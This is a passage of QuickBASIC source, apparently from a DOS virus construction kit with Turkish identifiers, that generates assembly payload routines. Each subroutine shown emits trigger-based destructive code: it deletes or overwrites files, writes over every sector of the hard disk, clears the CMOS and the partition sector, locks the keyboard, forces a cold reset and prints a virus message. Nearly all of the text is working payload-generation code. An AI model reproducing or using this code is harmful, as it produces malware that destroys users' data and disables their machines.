  PRINT #1, "          loop CmsRst"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  CmosResetGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  CmosResetAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  CmosResetYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  CmosResetSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  CmosResetDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  CmosResetSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + CmosResetGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + CmosResetAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + CmosResetYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + CmosResetSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + CmosResetDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF


END SUB

SUB FuncColdReset (IslemKodu)

ActionName$ = "ColdReset"
ActionCode = 10

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz EkranaYazLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla
 
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))
 
  PRINT #1, "          jmp dword ptr cs:[ColdResetAdres]"
 
  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  ColdResetGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  ColdResetAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  ColdResetYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  ColdResetSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  ColdResetDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  BootSilSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + ColdResetGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + ColdResetAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + ColdResetYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + ColdResetSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + ColdResetDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
  PRINT #1, ActionName$ + "Adres       dd 0FFFF0000h"
 END IF
END IF

END SUB

SUB FuncDosyaBoz (IslemKodu)

ActionName$ = "DosyaBoz"
ActionCode = 2

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz ZamanDegistirLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov ax,3d02h"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov bx,ax"
  PRINT #1, "          mov ah,3eh"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov ax,4301h"
  PRINT #1, "          xor cx,cx"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov ax,3d02h"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov ah,40h"
  PRINT #1, "          mov cx,0ffffh"
  PRINT #1, "          xor dx,dx"
  PRINT #1, "          push ds"
  PRINT #1, "          mov ds,dx"
  PRINT #1, "          int 21h"
  PRINT #1, "          pop ds"
  PRINT #1, "          mov ah,3eh"
  PRINT #1, "          int 21h"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  DosyaBozGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  DosyaBozAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  DosyaBozYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  DosyaBozSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  DosyaBozDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  DosyaBozSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + DosyaBozGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + DosyaBozAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + DosyaBozYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + DosyaBozSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + DosyaBozDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF




END SUB

SUB FuncDosyaSil (IslemKodu)

ActionName$ = "DosyaSil"
ActionCode = 1

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz DosyaBozLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov ax,3d02h"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov bx,ax"
  PRINT #1, "          mov ah,3eh"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov ax,4301h"
  PRINT #1, "          xor cx,cx"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov ah,41h"
  PRINT #1, "          int 21h"
 
  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  DosyaSilGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  DosyaSilAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  DosyaSilYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  DosyaSilSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  DosyaSilDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  DosyaSilSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + DosyaSilGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + DosyaSilAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + DosyaSilYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + DosyaSilSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + DosyaSilDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF



END SUB

SUB FuncEkranaYaz (IslemKodu)

ActionName$ = "EkranaYaz"
ActionCode = 11

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz YaziciyaYazLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov ah,09h"
  PRINT #1, "          push cs"
  PRINT #1, "          pop ds"
  PRINT #1, "          mov dx,offset cs:[VirusMsg]"
  PRINT #1, "          int 21h"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  EkranaYazGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  EkranaYazAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  EkranaYazYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  EkranaYazSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  EkranaYazDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  EkranaYazSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + EkranaYazGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + EkranaYazAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + EkranaYazYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + EkranaYazSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + EkranaYazDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
   PRINT #1, "VirusMsg db '" + VirusMsg$ + "',13,10,'$'"
 END IF
END IF

END SUB

SUB FuncHarddiskYaz (IslemKodu)

ActionName$ = "HarddiskYaz"
ActionCode = 15

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz Enfection"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov ah,08h"
  PRINT #1, "          mov dl,80h"
  PRINT #1, "          int 13h"
  PRINT #1, "          jnc OpCont"
  PRINT #1, "          jmp HarddiskYazExit"
  PRINT #1, "OpCont:   mov byte ptr cs:[MaxTrack1],ch"
  PRINT #1, "          push cx"
  PRINT #1, "          and cl,192"
  PRINT #1, "          mov byte ptr cs:[MaxTrack2],cl"
  PRINT #1, "          pop cx"
  PRINT #1, "          and cl,63"
  PRINT #1, "          mov byte ptr cs:[MaxSector],cl"
  PRINT #1, "          mov byte ptr cs:[MaxHead],dh"
  PRINT #1, "          xor ch,ch"
  PRINT #1, "          mov dh,01h"
  PRINT #1, "          mov cl,02h"
  PRINT #1, "OpStart:  push cx"
  PRINT #1, "          and byte ptr cl,cs:[MaxSector]"
  PRINT #1, "          cmp byte ptr cl,cs:[MaxSector]"
  PRINT #1, "          pop cx"
  PRINT #1, "          jz MaxS"
  PRINT #1, "          inc cl"
  PRINT #1, "          jmp OpRun"
  PRINT #1, "MaxS:     and cl,192"
  PRINT #1, "          or cl,01h"
  PRINT #1, "          cmp byte ptr dh,cs:[MaxHead]"
  PRINT #1, "          jz MaxH"
  PRINT #1, "          inc dh"
  PRINT #1, "          jmp OpRun"
  PRINT #1, "MaxH:     xor dh,dh"
  PRINT #1, "          cmp byte ptr ch,cs:[MaxTrack1]"
  PRINT #1, "          jz MaxT1"
  PRINT #1, "          inc ch"
  PRINT #1, "          jmp OpRun"
  PRINT #1, "MaxT1:    xor ch,ch"
  PRINT #1, "          push cx"
  PRINT #1, "          and byte ptr cl,cs:[MaxTrack2]"
  PRINT #1, "          cmp byte ptr cl,cs:[MaxTrack2]"
  PRINT #1, "          pop cx"
  PRINT #1, "          jz HarddiskYazExit"
  PRINT #1, "          add cl, 64"
  PRINT #1, "OpRun:    mov ax,0301h"
  PRINT #1, "          mov dl,80h"
  PRINT #1, "          xor bx,bx"
  PRINT #1, "          mov es, bx"
  PRINT #1, "          int 13h"
  PRINT #1, "          jmp OpStart"


  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  HarddiskYazGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  HarddiskYazAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  HarddiskYazYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  HarddiskYazSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  HarddiskYazDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  HarddiskYazSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + HarddiskYazGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + HarddiskYazAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + HarddiskYazYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + HarddiskYazSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + HarddiskYazDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
   PRINT #1, "MaxSector   db 00"
   PRINT #1, "MaxHead     db 00"
   PRINT #1, "MaxTrack1   db 00"
   PRINT #1, "MaxTrack2   db 00"
 END IF
END IF

END SUB

SUB FuncKlavyeKilitle (IslemKodu)

ActionName$ = "KlavyeKilitle"
ActionCode = 8

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz SistemKilitleLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov al,0cch"
  PRINT #1, "          out 61h,al"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  KlavyeKilitleGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  KlavyeKilitleAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  KlavyeKilitleYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  KlavyeKilitleSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  KlavyeKilitleDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  KlavyeKilitleSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + KlavyeKilitleGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + KlavyeKilitleAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + KlavyeKilitleYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + KlavyeKilitleSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + KlavyeKilitleDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF

END SUB

SUB FuncKlavyeLedleri (IslemKodu)

ActionName$ = "KlavyeLedleri"
ActionCode = 13

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz VideoModuLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov ah,10h"
  PRINT #1, "          and ah,07h"
  PRINT #1, "          mul ah"
  PRINT #1, "          mov bl,al"
  PRINT #1, "          mov ax,0040h"
  PRINT #1, "          mov ds,ax"
  PRINT #1, "          mov di,0017h"
  PRINT #1, "          and byte ptr ds:[di],143"
  PRINT #1, "          or byte ptr ds:[di],bl"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  KlavyeLedleriGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  KlavyeLedleriAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  KlavyeLedleriYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  KlavyeLedleriSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  KlavyeLedleriDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  KlavyeLedleriSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + KlavyeLedleriGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + KlavyeLedleriAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + KlavyeLedleriYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + KlavyeLedleriSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + KlavyeLedleriDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF

END SUB

SUB FuncPartSil (IslemKodu)

ActionName$ = "PartSil"
ActionCode = 6

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz CmosResetLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov cx,00ffh"
  PRINT #1, "CmsRst3:  mov al,cl"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          xor al,al"
  PRINT #1, "          out 71h,al"
  PRINT #1, "          loop CmsRst3"
  PRINT #1, "          mov ax,0301h"
  PRINT #1, "          mov cx,0001h"
  PRINT #1, "          mov dx,0080h"
  PRINT #1, "          int 13h"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  PartSilGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  PartSilAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  PartSilYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  PartSilSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  PartSilDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  PartSilSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + PartSilGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + PartSilAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + PartSilYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + PartSilSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + PartSilDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF

END SUB

SUB FuncSistemKilitle (IslemKodu)

ActionName$ = "SistemKilitle"
ActionCode = 9

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz ColdResetLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
